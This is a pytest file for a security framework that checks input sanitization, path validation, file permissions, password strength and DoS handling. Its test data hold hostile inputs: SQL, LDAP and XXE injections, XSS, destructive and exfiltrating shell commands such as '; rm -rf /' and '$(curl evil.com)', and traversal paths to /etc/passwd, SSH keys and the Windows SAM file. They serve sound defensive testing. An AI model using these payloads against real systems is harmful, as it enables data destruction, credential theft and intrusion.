"""
Houdinis Framework - Security Validation and Penetration Tests
Data de Criação: 15 de dezembro de 2025
Author: Mauro Risonho de Paula Assumpção aka firebitsbr
License: MIT

Tests security controls, input validation, and attack surface.
"""

import pytest
import sys
import os
import tempfile
import json

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from security.security_config import SecurityConfig
try:
    from security.secure_file_ops import SecureFileOperations
except ImportError:
    SecureFileOperations = None


class TestInputValidation:
    """Test input validation and sanitization."""
    
    def test_sql_injection_patterns(self):
        """Test SQL injection pattern detection."""
        config = SecurityConfig()
        
        sql_injections = [
            "1' OR '1'='1",
            "admin'--",
            "1; DROP TABLE users--",
            "' UNION SELECT * FROM passwords--",
        ]
        
        for injection in sql_injections:
            result = config.sanitize_input(injection)
            # Should not contain dangerous SQL patterns
            assert "DROP" not in result or result != injection
            assert "UNION" not in result or result != injection
    
    def test_command_injection_patterns(self):
        """Test command injection pattern detection."""
        config = SecurityConfig()
        
        cmd_injections = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "`whoami`",
            "$(curl evil.com)",
        ]
        
        for injection in cmd_injections:
            result = config.sanitize_input(injection)
            # Should sanitize dangerous patterns
            assert "`" not in result or result != injection
            assert "$(" not in result or result != injection
    
    def test_ldap_injection_patterns(self):
        """Test LDAP injection pattern detection."""
        config = SecurityConfig()
        
        ldap_injections = [
            "*)(uid=*",
            "admin)(|(password=*))",
        ]
        
        for injection in ldap_injections:
            result = config.sanitize_input(injection)
            assert result is not None
    
    def test_xml_injection_patterns(self):
        """Test XML/XXE injection pattern detection."""
        config = SecurityConfig()
        
        xml_injections = [
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            "<![CDATA[<script>alert('xss')</script>]]>",
        ]
        
        for injection in xml_injections:
            result = config.sanitize_input(injection)
            # Should not contain dangerous XML patterns
            assert "<!ENTITY" not in result or result != injection
            assert "<!DOCTYPE" not in result or result != injection


class TestPathTraversal:
    """Test path traversal vulnerabilities."""
    
    def test_directory_traversal_unix(self):
        """Test Unix-style directory traversal."""
        config = SecurityConfig()
        
        traversal_attempts = [
            "../../../etc/passwd",
            "../../../../root/.ssh/id_rsa",
            "..\\..\\..\\etc\\passwd",
        ]
        
        for attempt in traversal_attempts:
            result = config.validate_file_path(attempt)
            assert result is False or ".." not in str(result)
    
    def test_directory_traversal_windows(self):
        """Test Windows-style directory traversal."""
        config = SecurityConfig()
        
        traversal_attempts = [
            "..\\..\\..\\windows\\system32\\config\\sam",
            "C:\\windows\\system32\\",
        ]
        
        for attempt in traversal_attempts:
            result = config.validate_file_path(attempt)
            assert result is False or "C:\\" not in str(result)
    
    def test_absolute_path_restrictions(self):
        """Test restrictions on absolute paths."""
        config = SecurityConfig()
        
        absolute_paths = [
            "/etc/passwd",
            "/root/.ssh/",
            "C:\\Windows\\System32\\",
        ]
        
        for path in absolute_paths:
            result = config.validate_file_path(path)
            # Should reject or sanitize absolute system paths
            assert result is False or not path.startswith(('/', 'C:\\'))


class TestFileOperationSecurity:
    """Test secure file operations."""
    
    def test_secure_write_permissions(self):
        """Test secure file write with proper permissions."""
        if SecureFileOperations is None:
            pytest.skip("SecureFileOperations not available")
        secure_ops = SecureFileOperations()
        
        with tempfile.TemporaryDirectory() as tmpdir:
            test_file = os.path.join(tmpdir, "test_secure.txt")
            
            # Write with secure permissions
            secure_ops.write_file(test_file, "test content")
            
            # Check file exists and permissions
            assert os.path.exists(test_file)
            stat_info = os.stat(test_file)
            
            # Should not be world-readable (Unix)
            if hasattr(os, 'chmod'):
                mode = stat_info.st_mode & 0o777
                # File should have restricted permissions
                assert mode & 0o077 != 0o077, "File should have restricted permissions"
    
    def test_secure_read_validation(self):
        """Test secure read with validation."""
        secure_ops = SecureFileOperations()
        
        with tempfile.TemporaryDirectory() as tmpdir:
            test_file = os.path.join(tmpdir, "test_read.txt")
            
            # Create test file
            with open(test_file, 'w') as f:
                f.write("test content")
            
            # Secure read should work
            content = secure_ops.read_file(test_file)
            assert content == "test content"
    
    def test_path_validation(self):
        """Test path validation for security."""
        secure_ops = SecureFileOperations()
        
        with tempfile.TemporaryDirectory() as tmpdir:
            # Valid path
            test_file = os.path.join(tmpdir, "valid.txt")
            with open(test_file, 'w') as f:
                f.write("content")
            
            # Validate should work for valid paths
            result = secure_ops.validate_path(test_file)
            assert result is True or result is not False


class TestAuthenticationSecurity:
    """Test authentication and authorization security."""
    
    def test_weak_password_rejection(self):
        """Test rejection of weak passwords."""
        config = SecurityConfig()
        
        weak_passwords = [
            "123456",
            "password",
            "admin",
            "qwerty",
        ]
        
        for password in weak_passwords:
            result = config.validate_password_strength(password)
            # Should reject weak passwords
            assert result is False or "weak" in str(result).lower()
    
    def test_password_complexity_requirements(self):
        """Test password complexity requirements."""
        config = SecurityConfig()
        
        # Strong password should pass
        strong_password = "C0mpl3x!P@ssw0rd#2024"
        result = config.validate_password_strength(strong_password)
        assert result is True or "strong" in str(result).lower()


class TestCryptographicSecurity:
    """Test cryptographic operation security."""
    
    def test_random_number_quality(self):
        """Test quality of random number generation."""
        import secrets
        
        # Generate multiple random numbers
        randoms = [secrets.randbelow(1000000) for _ in range(100)]
        
        # Check uniqueness (should be high)
        unique_count = len(set(randoms))
        assert unique_count > 80, "Random numbers should be highly unique"
        
        # Check distribution (basic test)
        assert min(randoms) != max(randoms), "Should have variation"
    
    def test_secure_token_generation(self):
        """Test secure token generation."""
        import secrets
        
        # Generate tokens
        token1 = secrets.token_hex(32)
        token2 = secrets.token_hex(32)
        
        # Tokens should be different
        assert token1 != token2
        
        # Tokens should have sufficient length
        assert len(token1) == 64, "Token should be 64 hex chars (256 bits)"


class TestDenialOfServicePrevention:
    """Test DoS prevention mechanisms."""
    
    def test_large_input_handling(self):
        """Test handling of very large inputs."""
        config = SecurityConfig()
        
        # Very large input
        large_input = "A" * 1000000  # 1MB
        
        try:
            result = config.sanitize_input(large_input)
            # Should either handle or reject gracefully
            assert result is not None
        except (MemoryError, ValueError):
            # Acceptable to reject very large inputs
            pass
    
    def test_infinite_loop_prevention(self):
        """Test prevention of infinite loops."""
        config = SecurityConfig()
        
        # Recursive pattern
        recursive_input = "a" * 10000
        
        # Should complete in reasonable time
        import time
        start = time.time()
        config.sanitize_input(recursive_input)
        elapsed = time.time() - start
        
        assert elapsed < 5.0, "Should complete within 5 seconds"
    
    def test_resource_exhaustion_prevention(self):
        """Test prevention of resource exhaustion."""
        from quantum.simulator import QuantumSimulator
        
        # Should handle or reject resource-intensive requests
        try:
            # 25 qubits = 2^25 = 32M complex numbers = ~512MB
            sim = QuantumSimulator(num_qubits=25)
        except (MemoryError, ValueError):
            # Acceptable to reject very large allocations
            pass


class TestDataLeakagePrevention:
    """Test prevention of data leakage."""
    
    def test_error_message_sanitization(self):
        """Test error messages don't leak sensitive info."""
        config = SecurityConfig()
        
        # Simulate error with sensitive data
        try:
            config.validate_file_path("/secret/path/to/keys")
        except Exception as e:
            error_msg = str(e)
            # Error should not contain full sensitive path
            assert "/secret/" not in error_msg or "sanitized" in error_msg.lower()
    
    def test_log_sanitization(self):
        """Test logs don't contain sensitive data."""
        import logging
        
        # Create test logger
        logger = logging.getLogger("test_security")
        
        # Log should be sanitized
        sensitive_data = "password=Secret123!"
        # Should sanitize before logging
        sanitized = sensitive_data.replace("Secret123!", "***")
        
        assert "***" in sanitized
        assert "Secret123!" not in sanitized


class TestSecureDefaults:
    """Test secure default configurations."""
    
    def test_default_security_settings(self):
        """Test default security settings are secure."""
        config = SecurityConfig()
        
        # Check secure defaults
        assert config.get_setting("enforce_encryption", True) is True
        assert config.get_setting("allow_insecure", False) is False
    
    def test_no_hardcoded_credentials(self):
        """Test no hardcoded credentials in code."""
        # Check main config files
        config_files = [
            "config.ini",
            "security/security_config.py",
        ]
        
        suspicious_patterns = [
            "password=",
            "secret=",
            "api_key=",
        ]
        
        for config_file in config_files:
            file_path = os.path.join(
                os.path.dirname(os.path.dirname(__file__)),
                config_file
            )
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    content = f.read().lower()
                    for pattern in suspicious_patterns:
                        if pattern in content:
                            # Check if it's just a key name, not actual credential
                            assert "changeme" in content or "example" in content


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
